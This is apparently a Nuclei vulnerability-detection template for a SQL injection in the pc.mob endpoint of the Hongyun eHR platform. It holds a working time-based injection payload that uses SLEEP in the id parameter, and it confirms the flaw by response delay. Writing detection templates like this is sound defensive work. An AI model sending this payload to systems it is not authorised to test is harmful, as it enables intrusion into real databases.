id: poc-yaml-hr-soft-pc-mob-sqli
info:
  name: 红海云eHR pc.mob SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects a potential SQL injection vulnerability in 红海云eHR pc.mob application.

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/RedseaPlatform/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/RedseaPlatform/skins/images/favicon.ico"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP({{t1}})))ndMq)%20AND%20%27NEoX%27=%27NEoX"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > t1"
          - "duration < t2"
